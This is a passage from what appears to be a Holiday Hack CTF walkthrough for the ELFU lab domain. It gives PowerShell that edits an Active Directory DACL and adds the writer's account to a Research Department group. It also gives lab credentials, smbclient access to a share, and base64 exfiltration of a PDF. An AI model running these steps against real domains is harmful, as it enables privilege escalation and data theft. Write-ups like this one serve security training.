<a id="__codelineno-9-18" name="__codelineno-9-18"></a>    <span class="err">$</span><span class="n">domainDirEntry</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">DirectoryServices</span><span class="o">.</span><span class="n">DirectoryEntry</span> <span class="err">$</span><span class="n">ldapConnString</span>
<a id="__codelineno-9-19" name="__codelineno-9-19"></a>    <span class="err">$</span><span class="n">SecOptions</span> <span class="o">=</span> <span class="err">$</span><span class="n">domainDirEntry</span><span class="o">.</span><span class="n">get_Options</span><span class="p">()</span>
<a id="__codelineno-9-20" name="__codelineno-9-20"></a>    <span class="err">$</span><span class="n">secOptions</span><span class="o">.</span><span class="n">SecurityMasks</span> <span class="o">=</span> <span class="p">[</span><span class="n">System</span><span class="o">.</span><span class="n">DirectoryServices</span><span class="o">.</span><span class="n">SecurityMasks</span><span class="p">]::</span><span class="n">Dacl</span>
<a id="__codelineno-9-21" name="__codelineno-9-21"></a>    <span class="err">$</span><span class="n">domainDirEntry</span><span class="o">.</span><span class="n">RefreshCache</span><span class="p">()</span>
<a id="__codelineno-9-22" name="__codelineno-9-22"></a>    <span class="err">$</span><span class="n">domainDirEntry</span><span class="o">.</span><span class="n">get_ObjectSecurity</span><span class="p">()</span><span class="o">.</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="err">$</span><span class="n">ACE</span><span class="p">)</span>
<a id="__codelineno-9-23" name="__codelineno-9-23"></a>    <span class="err">$</span><span class="n">domainDirEntry</span><span class="o">.</span><span class="n">CommitChanges</span><span class="p">()</span>
<a id="__codelineno-9-24" name="__codelineno-9-24"></a>    <span class="err">$</span><span class="n">domainDirEntry</span><span class="o">.</span><span class="n">dispose</span><span class="p">()</span>
</code></pre></div>
<p>Modify and run the following code on the DC to add your ELFU grades portal account to the research department group (replace $username and $password).</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a>    <span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="n">System</span><span class="o">.</span><span class="n">DirectoryServices</span>
<a id="__codelineno-10-2" name="__codelineno-10-2"></a>    <span class="err">$</span><span class="n">ldapConnString</span> <span class="o">=</span>  <span class="s2">&quot;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&quot;</span>
<a id="__codelineno-10-3" name="__codelineno-10-3"></a>    <span class="err">$</span><span class="n">username</span> <span class="o">=</span> <span class="s2">&quot;tielcxbxev&quot;</span>
<a id="__codelineno-10-4" name="__codelineno-10-4"></a>    <span class="err">$</span><span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;Lszfmilek@&quot;</span>
<a id="__codelineno-10-5" name="__codelineno-10-5"></a>    <span class="err">$</span><span class="n">domainDirEntry</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">DirectoryServices</span><span class="o">.</span><span class="n">DirectoryEntry</span> <span class="err">$</span><span class="n">ldapConnString</span><span class="p">,</span> <span class="err">$</span><span class="n">username</span><span class="p">,</span> <span class="err">$</span><span class="n">password</span>
<a id="__codelineno-10-6" name="__codelineno-10-6"></a>    <span class="err">$</span><span class="n">user</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="o">.</span><span class="n">Security</span><span class="o">.</span><span class="n">Principal</span><span class="o">.</span><span class="n">NTAccount</span><span class="p">(</span><span class="s2">&quot;elfu.local\$username&quot;</span><span class="p">)</span>
<a id="__codelineno-10-7" name="__codelineno-10-7"></a>    <span class="err">$</span><span class="n">sid</span><span class="o">=</span><span class="err">$</span><span class="n">user</span><span class="o">.</span><span class="n">Translate</span><span class="p">([</span><span class="n">System</span><span class="o">.</span><span class="n">Security</span><span class="o">.</span><span class="n">Principal</span><span class="o">.</span><span class="n">SecurityIdentifier</span><span class="p">])</span>
<a id="__codelineno-10-8" name="__codelineno-10-8"></a>    <span class="err">$</span><span class="n">b</span><span class="o">=</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="err">$</span><span class="n">sid</span><span class="o">.</span><span class="n">BinaryLength</span>
<a id="__codelineno-10-9" name="__codelineno-10-9"></a>    <span class="err">$</span><span class="n">sid</span><span class="o">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="err">$</span><span class="n">b</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
<a id="__codelineno-10-10" name="__codelineno-10-10"></a>
<a id="__codelineno-10-11" name="__codelineno-10-11"></a>    <span class="err">$</span><span class="n">hexSID</span><span class="o">=</span><span class="p">[</span><span class="n">BitConverter</span><span class="p">]::</span><span class="n">ToString</span><span class="p">(</span><span class="err">$</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
<a id="__codelineno-10-12" name="__codelineno-10-12"></a>    <span class="err">$</span><span class="n">domainDirEntry</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="s2">&quot;LDAP://&lt;SID=$hexSID&gt;&quot;</span><span class="p">)</span>
<a id="__codelineno-10-13" name="__codelineno-10-13"></a>    <span class="err">$</span><span class="n">domainDirEntry</span><span class="o">.</span><span class="n">CommitChanges</span><span class="p">()</span>
<a id="__codelineno-10-14" name="__codelineno-10-14"></a>    <span class="err">$</span><span class="n">domainDirEntry</span><span class="o">.</span><span class="n">dispose</span><span class="p">()</span>
</code></pre></div>
<p>You can verify the group addition by running <code>Get-ADGroupMember -identity "ResearchDepartment" | select name</code>.</p>
<p>Now exit the remote PS session on the DC by running <code>exit</code>.</p>
<p>Connect to the research department share from the grades server using the ELFU grades portal account and the command <code>smbclient -U tielcxbxev%Lszfmilek@ //10.128.3.30/research_dep</code>.</p>
<p>Here is a <code>ls</code> listing for the research department share:</p>
<p><img alt="Obj" src="../../../images/obj/8/image17.png" /></p>
<p>Run 'mget *' on the smb session to download <code>SantaSecretToAWonderfulHolidaySeason.pdf</code>. Exit the smb session.</p>
<p>Exfiltrate the data by running this command on the grades server <code>base64 ./SantaSecretToAWonderfulHolidaySeason.pdf</code>.</p>
<p>Copy and paste the BASE64 string to your local device as <code>filebase64.txt</code>.</p>
<p>Decode the BASE64 file by running <code>base64 -d filebase64.txt &gt;SantaSecretToAWonderfulHolidaySeason.pdf</code></p>
<p>Openning the file on a sandbox shows the following:</p>
<p><img alt="Obj" src="../../../images/obj/8/image18.png" /></p>
<div class="admonition success">
<p class="admonition-title">Answer</p>
<p>Kindness</p>
</div>
</div>
</div>
</div>

              
            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../Objective7/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 7) Printer Exploitation" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              7) Printer Exploitation
            </div>
          </div>
        </a>
      
      
        
        <a href="../Objective9/" class="md-footer__link md-footer__link--next" aria-label="Next: 9) Splunk!" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              9) Splunk!
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "content.tabs.link"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.0bbba5b5.min.js"}</script>
    
    
      <script src="../../../assets/javascripts/bundle.e1a181d9.min.js"></script>
      
    
  </body>
</html>